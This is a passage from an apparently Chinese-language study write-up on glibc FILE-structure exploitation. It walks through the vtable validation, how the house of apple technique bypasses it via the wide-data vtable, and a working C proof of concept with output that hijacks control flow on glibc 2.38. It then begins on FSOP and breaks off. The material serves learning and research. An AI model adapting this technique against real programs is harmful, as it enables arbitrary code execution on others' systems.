<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/<span class="number">86135</span>/Desktop/pwncollege/software/file/test]</span><br><span class="line">└─# ./orange</span><br><span class="line">fake_vtable @ <span class="number">0x123e2a0</span></span><br><span class="line">fp @ <span class="number">0x123e7c0</span></span><br><span class="line">vtable_ptr = <span class="number">0x123e898</span></span><br><span class="line">original vtable_addr = <span class="number">0x7f4da32ca070</span></span><br><span class="line">new vtable_addr = <span class="number">0x123e2a0</span></span><br><span class="line">Fatal error: glibc detected an invalid stdio handle</span><br><span class="line">Aborted (core dumped)</span><br></pre></td></tr></table></figure>
<h3 id="house-of-apple-glibc-2.23">[house of apple @ glibc &gt;
2.23]</h3>
<p>针对虚表的攻击通常能够想到两种方式</p>
<p>1.保持虚表地址不变,修改虚表上的函数指针</p>
<p>2.造假虚表,然后修改虚表指针</p>
<p>对于1来说,虚表位于<code>glibc</code>的代码段,通常是只读的,不允许随便改函数指针</p>
<p>对于2来说,<code>glibc2.23</code>之前是可以劫持虚表指针的,相关攻击方法叫做<code>house of orange</code></p>
<p><code>glibc2.24</code>之后就加入了虚表的合法性检查</p>
<p>但也不是不能利用了，新方法叫<code>house of apple</code></p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/libioP.h#L398</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) _IO_JUMPS_FILE_plus (THIS)</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/glibc/glibc-2.24/source/libio/libioP.h#L133</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span></span><br></pre></td></tr></table></figure>
<p><code>IO_validate_vtable</code>会检查虚表的合法性</p>
</blockquote>
<p><strong>这个虚表合法性检查会发生在何时呢?</strong></p>
<p><code>fwrite</code>实际上调用<code>_IO_fwrite</code>,<code>if</code>判断通过,会执行<code>__IO_sputn</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span> || _IO_fwide (fp, <span class="number">-1</span>) == <span class="number">-1</span>)	<span class="comment">//</span></span><br><span class="line">  written = _IO_sputn (fp, (<span class="type">const</span> <span class="type">char</span> *) buf, request);	<span class="comment">//</span></span><br></pre></td></tr></table></figure>
<p>这里<code>_IO_sputn</code>是一个宏定义,会在检查<code>vtable</code>合法性之后调用<code>vtable.xsputn</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_sputn(__fp,__s,__n) _IO_XSPUTN (__fp, __s, __n)</span></span><br><span class="line">扩展到:</span><br><span class="line">((IO_validate_vtable ((*(__typeof__ (((<span class="keyword">struct</span> _IO_FILE_plus)&#123;&#125;).vtable) *)(((<span class="type">char</span> *) ((fp))) + __builtin_offsetof(<span class="keyword">struct</span> _IO_FILE_plus, vtable)))))-&gt;__xsputn) (fp, (<span class="type">const</span> <span class="type">char</span> *) buf, request)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>同理,不管<code>fread</code>还是<code>fwrite</code>实际上都会在经过<code>vtable</code>合法性检查后,调用<code>vtable</code>中的函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p><strong>虚表合法性检查了什么呢?</strong></p>
<p>而<code>IO_validate_vtable</code>会检查虚表是否是<code>glibc</code>预定义好的虚表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class="line"><span class="comment">   the process.  */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *</span><br><span class="line"><span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - (<span class="type">uintptr_t</span>) &amp;__io_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= IO_VTABLES_LEN))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>ptr = vtable</code>是<code>FILE</code>结构的虚表指针</p>
<p><code>const struct _IO_jump_t __io_vtables[]</code>是<code>vtables.c</code>中预定义好的虚表数组</p>
<p>在<code>libioP.h</code>中暴露了这些虚表的引用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> __<span class="title">io_vtables</span>[] <span class="title">attribute_hidden</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_str_jumps                    (__io_vtables[IO_STR_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_wstr_jumps                   (__io_vtables[IO_WSTR_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_jumps                   (__io_vtables[IO_FILE_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_jumps_mmap              (__io_vtables[IO_FILE_JUMPS_MMAP])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_jumps_maybe_mmap        (__io_vtables[IO_FILE_JUMPS_MAYBE_MMAP])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_wfile_jumps                  (__io_vtables[IO_WFILE_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_wfile_jumps_mmap             (__io_vtables[IO_WFILE_JUMPS_MMAP])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_wfile_jumps_maybe_mmap       (__io_vtables[IO_WFILE_JUMPS_MAYBE_MMAP])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_cookie_jumps                 (__io_vtables[IO_COOKIE_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_proc_jumps                   (__io_vtables[IO_PROC_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_mem_jumps                    (__io_vtables[IO_MEM_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_wmem_jumps                   (__io_vtables[IO_WMEM_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_printf_buffer_as_file_jumps  (__io_vtables[IO_PRINTF_BUFFER_AS_FILE_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_wprintf_buffer_as_file_jumps (__io_vtables[IO_WPRINTF_BUFFER_AS_FILE_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_old_file_jumps               (__io_vtables[IO_OLD_FILE_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_old_proc_jumps               (__io_vtables[IO_OLD_PROC_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_old_cookie_jumps             (__io_vtables[IO_OLD_COOKIED_JUMPS])</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IO_VTABLES_LEN (IO_VTABLES_NUM * sizeof (struct _IO_jump_t))</span></span><br><span class="line">IO_VTABLES_NUM = <span class="number">14</span></span><br><span class="line"><span class="keyword">sizeof</span> (<span class="keyword">struct</span> _IO_jump_t) = <span class="number">168</span></span><br><span class="line">IO_VTABLES_LEN = <span class="number">14</span>*<span class="number">168</span> = <span class="number">2352</span></span><br></pre></td></tr></table></figure>
<p>也就是说一共有14个预定义的虚表</p>
<p>通常情况下使用的虚表是<code>_IO_file_jumps = __io_vtables[IO_FILE_JUMPS]</code></p>
<p><code>IO_validate_vtable</code>检查虚表<strong>必须是这14个其中之一</strong>,防止被用户劫持篡改指向了堆栈或者堆</p>
<p><strong>如何绕过虚表检查呢?</strong></p>
<p>当fread函数被调用时,调用过程是这样的:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_IO_fread</span><br><span class="line">	_IO_sgetn</span><br><span class="line">		_IO_XSGETN</span><br><span class="line">			JUMP2</span><br><span class="line">				_IO_JUMPS_FUNC</span><br><span class="line">=&gt;					IO_validate_vtable </span><br><span class="line">						_IO_JUMPS_FILE_plus</span><br></pre></td></tr></table></figure>
<p><code>IO_validate_vtable</code>是必然被调用的,检查的是<code>_IO_FILE_plus.vtable</code></p>
<p>然而在<code>_IO_XSGETN</code>宏定义这里还有一个兄弟叫<code>_IO_WXSGETN</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.38/libio/libioP.h:184</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WXSGETN(FP, DATA, N) WJUMP2 (__xsgetn, FP, DATA, N)</span></span><br></pre></td></tr></table></figure>
<p>这个兄弟宏定义展开发现是没有<code>_IO_validate_vtable</code>这种检查的,会直接调用到<code>_IO_FILE._wide_data-&gt;_wide_vtable</code>中的函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_WXSGETN</span><br><span class="line">	WJUMP2</span><br><span class="line">		_IO_WIDE_JUMPS_FUNC</span><br><span class="line">			_IO_WIDE_JUMPS</span><br><span class="line">				_IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span><br></pre></td></tr></table></figure>
<p>也就是说劫持<code>_wide_vtable</code>虚表指针是不会被检查的</p>
<p>而<code>_wide_data</code>结构体位于<code>libc</code>的只读内存区中,无法修改其中的<code>_wide_vtable</code>,因此还需要伪造一个<code>_wide_data</code></p>
<p>并且只劫持<code>_wide_vtable</code>还不够,因为正常情况下控制流是绝对不会进入任何一个宽字节相关函数的</p>
<p>所以还需要把<code>_IO_FILE_plus.vtable</code>改成<code>IO_WFILE_JUMPS</code></p>
<p>最后再调用一个<code>fwrite</code></p>
<p>接下来控制流是这样的:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fwrite</span><br><span class="line">	=&gt; vtable+0x38</span><br><span class="line">		=&gt; _IO_wfile_xsputn</span><br><span class="line">			=&gt; _IO_wdefault_xsputn @ glibc/libio/wgenops.c</span><br><span class="line">				=&gt; __woverflow</span><br><span class="line">					=&gt; vtable+0x18</span><br><span class="line">						=&gt; _IO_wfile_overflow</span><br><span class="line">							=&gt; _IO_wdoallocbuf</span><br><span class="line">								=&gt; _IO_WDOALLOCATE (wide_data.wide_vtable+0x68 =&gt; win )</span><br></pre></td></tr></table></figure>
<p><strong>总结</strong></p>
<p>总的来说,需要干这么几步:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0.泄露libc基地址,计算得到_IO_wfile_jumps表的地址</span><br><span class="line">1.构造fake_wide_vtable,在其中填充目标函数(关键是+0x68位置)</span><br><span class="line">2.构造fake_wide_data,使得其偏移0xe0处的_wide_vtable指针吗,指向1中构造的fake_wide_vtable</span><br><span class="line">3.修改FILE.flag |= ~(_IO_CURRENTLY_PUTTING | _IO_NO_WRITES | _IO_UNBUFFERED) // ~(0x800 | 0x8 | 0x2)</span><br><span class="line">4.修改FILE.vtable指向3中泄露的_IO_wfile_jumps</span><br><span class="line">5.修改FILE._wide_data指向2中构造的fake_wide_data</span><br><span class="line">6.fwrite触发house of apple</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里复位了三个<code>flag</code>,各自的作用是:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_overflow (FILE *f, <span class="type">wint_t</span> wch)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span>		<span class="comment">//2.必须有写权限</span></span><br><span class="line"> &#123;</span><br><span class="line">   f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">   __set_errno (EBADF);</span><br><span class="line">   <span class="keyword">return</span> WEOF;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line"><span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span>		<span class="comment">//1.不能是_IO_CURRENTLY_PUTTING,这样就会进入本if从而调用到_IO_wdoallocbuf</span></span><br><span class="line">   || f-&gt;_wide_data-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">   <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_wdoallocbuf (f);</span><br><span class="line">	  _IO_free_wbackup_area (f);</span><br><span class="line">	  _IO_wsetg (f, f-&gt;_wide_data-&gt;_IO_buf_base,</span><br><span class="line">		     f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      _IO_doallocbuf (f);</span><br><span class="line">	      _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)</span><br><span class="line"> <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))		<span class="comment">//_IO_UNBUFFERED必须等于0才会进入本if,调用到_IO_WDOALLOCATE</span></span><br><span class="line"> <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)</span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line">_IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,</span><br><span class="line">		     fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p><strong>写个poc意思意思</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _NR_sysexit 0x3C</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function win called\n&quot;</span> );</span><br><span class="line">    syscall(_NR_sysexit);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span>* libc_base_addr;</span><br><span class="line">    <span class="type">size_t</span>* _IO_wfile_jumps;</span><br><span class="line">    <span class="type">size_t</span>* fake_wide_vtable;</span><br><span class="line">    <span class="type">size_t</span>* fake_wide_data;</span><br><span class="line"></span><br><span class="line">    FILE * fp;</span><br><span class="line">    <span class="type">size_t</span>* vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span>* vtable_addr;</span><br><span class="line">    <span class="type">size_t</span>* wide_data_ptr;</span><br><span class="line">    <span class="type">size_t</span>* wide_data_addr;</span><br><span class="line">    <span class="type">size_t</span>* wide_vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span>* wide_vtable_addr;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//0.泄露libc基地址,计算得到_IO_wfile_jumps表的地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function printf @ %p\n&quot;</span>, <span class="built_in">printf</span>);</span><br><span class="line">    libc_base_addr = (<span class="type">char</span>*) <span class="built_in">printf</span> - <span class="number">0x54110</span>;     <span class="comment">// printf offset @ glibc-2.38</span></span><br><span class="line">    _IO_wfile_jumps = (<span class="type">char</span>*)libc_base_addr + <span class="number">0x1d5268</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;_IO_wfile_jumps @ %p\n&quot;</span>,_IO_wfile_jumps);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.构造fake_wide_vtable,使用win填充</span></span><br><span class="line">    fake_wide_vtable = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;++i)&#123;</span><br><span class="line">        fake_wide_vtable[i]=win;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.构造fake_wide_data,使得其偏移0xe0处的_wide_vtable指针,指向1中构造的fake_wide_vtable</span></span><br><span class="line">    fake_wide_data = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    fake_wide_data[<span class="number">28</span>] = fake_wide_vtable;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3.修改FILE.flag |= ~(_IO_CURRENTLY_PUTTING | _IO_NO_WRITES | _IO_UNBUFFERED) </span></span><br><span class="line">    fp = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fp-&gt;_flags |= ~(<span class="number">0x800</span> | <span class="number">0x8</span> | <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//4.修改FILE.vtable指向3中泄露的_IO_wfile_jumps</span></span><br><span class="line">    vtable_ptr = (<span class="type">char</span>*)fp + <span class="number">0xd8</span>;</span><br><span class="line">    *vtable_ptr = _IO_wfile_jumps;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//5.修改FILE._wide_data指向2中构造的fake_wide_data</span></span><br><span class="line">    wide_data_ptr = (<span class="type">char</span>*)fp + <span class="number">0xa0</span>;</span><br><span class="line">    *wide_data_ptr = fake_wide_data;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//6.trigger house of apple</span></span><br><span class="line">    fwrite(buffer,<span class="number">1</span>,<span class="number">100</span>,fp);</span><br><span class="line"></span><br><span class="line">    fclose(fp); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>基于<code>glibc2.38</code>做实验,<code>win</code>函数被调用了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/file/test]</span><br><span class="line">└─# gcc apple.c -o apple -g -no-pie -w</span><br><span class="line"></span><br><span class="line">┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/file/test]</span><br><span class="line">└─# ./apple</span><br><span class="line">function printf @ 0x7f7e72eba110</span><br><span class="line">_IO_wfile_jumps @ 0x7f7e7303b268</span><br><span class="line">function win called</span><br></pre></td></tr></table></figure>
<h3 id="fsop">FSOP</h3>
<p>上集说到,<code>house of apple</code>在构造好了<code>FILE</code>之后,还要对其进行一个<code>fwrite</code>等操作触发到<code>_IO_wfile_overflow</code>函数</p>
<p>在本集中,<strong>不需要</strong>调用<code>fwrite</code>等操作,也可以触发,相关攻击方式叫做<code>FSOP(File Structure Oriented Programming)</code></p>
<p>程序退出时,会有这么一条调用链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br><span class="line">	_run_exit_handlers</span><br><span class="line">		_IO_cleanup</span><br><span class="line">			_IO_flush_all</span><br><span class="line">				_IO_OVERFLOW</span><br><span class="line">					vtable + 0x18 =&gt; _IO_file_overflow</span><br></pre></td></tr></table></figure>
<p>这个<code>_IO_flush_all</code>中会把<code>_IO_list_all</code>上挂着的都尝试一下<code>_IO_OVERFLOW</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">   &#123;</span><br><span class="line">     run_fp = fp;</span><br><span class="line">     _IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">			    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br><span class="line"></span><br><span class="line">     _IO_funlockfile (fp);</span><br><span class="line">     run_fp = <span class="literal">NULL</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>这里能够执行<code>_IO_OVERFLOW</code>的条件是下式为真</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) </span><br><span class="line">|| </span><br><span class="line">(</span><br><span class="line">    _IO_vtable_offset(fp) == <span class="number">0</span> </span><br><span class="line">    &amp;&amp;</span><br><span class="line">    fp-&gt;_mode &gt; <span class="number">0</span> </span><br><span class="line">    &amp;&amp; </span><br><span class="line">    (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>翻译成人话就是下面两条<strong>有一条为真</strong>即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.如果fp-&gt;_mode&lt;=0,还需要满足fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br><span class="line">2.如果fp-&gt;_mode&gt; 0,还需要满足fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</span><br></pre></td></tr></table></figure>
<p>如果能够使用<code>house of apple</code>的方法,</p>
